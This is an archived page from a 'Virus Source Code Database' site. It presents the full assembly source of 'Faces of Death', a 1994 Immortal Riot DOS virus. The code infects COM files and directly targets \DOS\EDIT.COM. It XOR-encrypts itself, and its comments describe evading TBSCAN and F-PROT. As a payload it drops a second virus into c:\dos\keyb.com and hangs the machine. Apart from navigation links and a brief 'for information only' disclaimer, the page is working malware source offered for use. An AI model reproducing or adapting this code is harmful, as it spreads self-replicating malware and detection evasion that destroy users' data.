<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: faces_asm</title>
<meta name="KEYWORDS" content="faces.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for faces.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="faces_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/faces_asm.php">faces_asm</a><br>
<a href="fade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fade_asm.php">fade_asm</a><br>
<a href="faerie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/faerie_asm.php">faerie_asm</a><br>
<a href="fat_fuck_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fat_fuck_asm.php">fat_fuck_asm</a><br>
<a href="fatman__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fatman__asm.php">fatman__asm</a><br>
<a href="fatman_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fatman_asm.php">fatman_asm</a><br>
<a href="femifbia_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/femifbia_pas.php">femifbia_pas</a><br>
<a href="ffire_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/ffire_asm.php">ffire_asm</a><br>
<a href="firecide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecide_asm.php">firecide_asm</a><br>
<a href="firecris_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecris_asm.php">firecris_asm</a><br>
<a href="firecrpt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firecrpt_asm.php">firecrpt_asm</a><br>
<a href="firefly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/firefly_asm.php">firefly_asm</a><br>
<a href="fish___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish___asm.php">fish___asm</a><br>
<a href="fish__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish__asm.php">fish__asm</a><br>
<a href="fish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fish_asm.php">fish_asm</a><br>
<a href="flagyll_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flagyll_asm.php">flagyll_asm</a><br>
<a href="flagyllz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flagyllz_asm.php">flagyllz_asm</a><br>
<a href="flip2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flip2_asm.php">flip2_asm</a><br>
<a href="flip_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flip_asm.php">flip_asm</a><br>
<a href="flu_not_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flu_not_asm.php">flu_not_asm</a><br>
<a href="flu_not_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/flu_not_c.php">flu_not_c</a><br>
<a href="fmt12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fmt12_asm.php">fmt12_asm</a><br>
<a href="fonetone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fonetone_asm.php">fonetone_asm</a><br>
<a href="foo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/foo_asm.php">foo_asm</a><br>
<a href="form2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/form2_asm.php">form2_asm</a><br>
<a href="formvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/formvir_asm.php">formvir_asm</a><br>
<a href="fri_13th_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fri_13th_asm.php">fri_13th_asm</a><br>
<a href="friday13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/friday13_asm.php">friday13_asm</a><br>
<a href="friday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/friday_asm.php">friday_asm</a><br>
<a href="frog_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/frog_asm.php">frog_asm</a><br>
<a href="froggie_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/froggie_pas.php">froggie_pas</a><br>
<a href="frtfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/frtfly_asm.php">frtfly_asm</a><br>
<a href="fruitfl2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitfl2_asm.php">fruitfl2_asm</a><br>
<a href="fruitfly_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitfly_asm.php">fruitfly_asm</a><br>
<a href="fruitful_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fruitful_asm.php">fruitful_asm</a><br>
<a href="fumanchu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fumanchu_asm.php">fumanchu_asm</a><br>
<a href="fun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/fun_asm.php">fun_asm</a><br>
<a href="funked_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/funked_asm.php">funked_asm</a><br>
<a href="funkybom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/funkybom_asm.php">funkybom_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; ------------------------------------------------------------------------------
;
;                       - Faces of Death -
;       Created by Immortal Riot's destructive development team
;              (c) 1994 The Unforgiven/Immortal Riot
;
; ------------------------------------------------------------------------------
;         þ Undetectable COM-infector(s) with a neat pay-load system! þ
; ------------------------------------------------------------------------------
.model tiny
.radix 16
.code
org    100h

start:

first_gen_buffer db 00,00,00,00   ; for first generation only!

v_start:

entry_point:

mov     sp,102h                   ; get the delta offset so tbscan cant
call    get_delta                 ; flag it as flexible entry point
get_delta:
mov     bp,word ptr ds:[100h]
mov     sp,0fffeh
sub     bp,offset get_delta


mov     ax,0305h                  ; this code was included to avoid detection
xor     bx,bx                     ; from tbscan. The vsafe disabeling code can
int     16h                       ; be used as well, but f-prot heuristics
                                  ; complains about it.

call    en_de_crypt               ; decrypt the virus
jmp     short real_start          ; and continue...

encrypt_value dw 0                ; random xor (encryption) value

write_virus:

call    en_de_crypt               ; write encrypted copy of the virus
mov     ah,40                     ;
mov     cx,code_end-v_start       ; # bytes
lea     dx,[bp+v_start]           ; dx:100h
int     21                        ;
call    en_de_crypt               ; decrypt virus again for further processing
ret

en_de_crypt:

mov     ax,word ptr [bp+encrypt_value]
lea     si,[bp+real_start]
mov     cx,(enc_end-real_start+1)/2

xor_loopie:

xor     word ptr [si],ax          ; encrypts two bytes/loop until all
inc     si                        ; code between real_start and enc_end
inc     si                        ; are encrypted
loop    xor_loopie
ret

real_start:

cmp     word ptr cs:[5dh],'?-'    ; check for -? in the command line
jne     chk_cond                  ; no valid virus option!

mov     ah,9                      ; tell them that i wrote the virus,
lea     dx,[bp+offset v_name]     ; and quit without infecting!
int     21h
int     20h

chk_cond:

mov     ah,2ch                    ; get time of 1/100 of a second value from
int     21h                       ; the system clock

cmp     dl,58                     ; value == 58h (88d)
jne     get_drive                 ; nope!

cr_file:                          ; value = 58h

mov     ah,3ch                    ; create the file c:\dos\keyb.com
mov     cx,0                      ; Doh! One byte wasted!
lea     dx,[bp+file_create]
int     21h

xchg    ax,bx
mov     ah,40h                    ; write the
mov     cx,len                    ; 80hex virus,
lea     dx,[bp+write]             ; from this virus
int     21h                       ; to keyb.com

mov     ah,3eh                        ; close file
lea     dx,[bp+offset file_create]    ; c:\dos\keyb.com
int     21h
jmp     $                             ; and hang

get_drive:

mov     ah,19h                    ; get drive from where we are executed from
int     21h                       ; check if it's a: or b:
cmp     al,2                      ; if so, return control to the original
jb      quit                      ; program without infecting other files

lea     si,[bp+org_buf]           ; copy the first four bytes of the file
mov     di,100                    ; (from di:100h) to org_buf
movsw                             ;
movsw                             ;

lea     dx,[bp+code_end]          ; set our own dta to code_end, so
call    set_dta                   ; the paramters when findfiles arent
                                  ; destroyed

lea     dx,[bp+direct_infect]     ; if present, infect
call    dirinfect                 ; \dos\edit.com

mov     ah,4e                     ; search for com files
lea     dx,[bp+com_files]         ;
find_next:
int     21

jc      no_more_files             ; no more files find, exit!
call    infect                    ; found a find, infect it!

mov     ah,4f                     ; search next file
jmp     short find_next           ; and see if we find one

no_more_files:                    ;
mov     dx,80                     ; set the dta to 80h (default)
call    set_dta                   ;

quit:                             ;
mov     di,100                    ; return control to original program
push    di                        ;
ret

infect:
lea     dx,[bp+code_end+1e]       ; 1e = adress to filename in ds:dx in our
                                  ; new dta area!
dirinfect:

mov     ax,3d02                   ; open file
int     21                        ; in read/write mode

jnc     infect_it                 ; if the file \dos\edit.com doesnt exist
ret                               ; return, and search first comfile

infect_it:
xchg    bx,ax                     ; filehandle in bx

mov     ax,5700                   ; get time/date
int     21

push    dx                        ; save date
push    cx                        ; save time

mov     ah,3f                     ; read the first four bytes
mov     cx,4                      ; of the file to org_buf
lea     dx,[bp+org_buf]
int     21

cmp     byte ptr [bp+org_buf+3],07h            ; previous infected
jz      finish_infect                          ;

cmp     word ptr [bp+org_buf],9090h            ; double nop
jz      finish_infect                          ;

cmp     word ptr [bp+org_buf],5a4dh            ; ZM (exe file)
jz      finish_infect                          ;

cmp     word ptr [bp+org_buf],4d5ah            ; MZ (exe-file)
jz      finish_infect                          ;

cmp     byte ptr [bp+org_buf+1],6Dh            ; command.com
jz      finish_infect                          ;

mov     ax, word ptr [bp+code_end+1ah]         ; <1000 bytes
cmp     ax,1000d                               ;
jb      finish_infect

cmp     ax,64000d                              ; >64000 bytes
ja      finish_infect                          ;

mov     ax,4202                                ; move file-pointer
xor     cx,cx                                  ; to end of file
cwd
int     21

sub     ax,3                                   ; substract bytes
mov     word ptr [bp+first_four+1],ax          ; to our own jump

get_value:

mov     ah,2ch                                 ; get system clock for
int     21h                                    ; 1/100 of a second
jz      get_value                              ; if zero = get new value
add     ax,3                                   ; this will be used for
mov     word ptr [bp+encrypt_value],dx         ; the xor-value
call    write_virus                            ; write virus to end of file

mov     ax,4200                   ; move file-pointer to
xor     cx,cx                     ; top of file
cwd
int     21

mov     ah,40                     ; write our own jump
mov     cx,4                      ; instruction to the
lea     dx,[bp+first_four]        ; beginning
int     21

finish_infect:
mov     ax,5701                   ; set back
pop     cx                        ; time
pop     dx                        ; date
int     21                        ;

mov     ah,3e                     ; close file
int     21

ret                               ; return and continue!

set_dta:
mov     ah,1a                     ; code to set the disk transfer area
int     21                        ;
ret

v_name           db   "Faces of Death - (c) 1994 The Unforgiven/Immortal Riot$"

direct_infect    db      '\DOS\EDIT.COM',0
file_create      db      'c:\dos\keyb.com',0

write            db      "þJÄNºJÍ!s´,Í!úOr°¹"
endwrite:

len              equ     endwrite-write

com_files        db      '*.com',0
first_four       db      0e9,90,90,07     ; buffer to calculate the new entry
org_buf          db      90,90,0CDh,20    ; buffer to save the first four bytes
enc_end:

code_end:
end start

</textarea></td></tr></table></body></html>
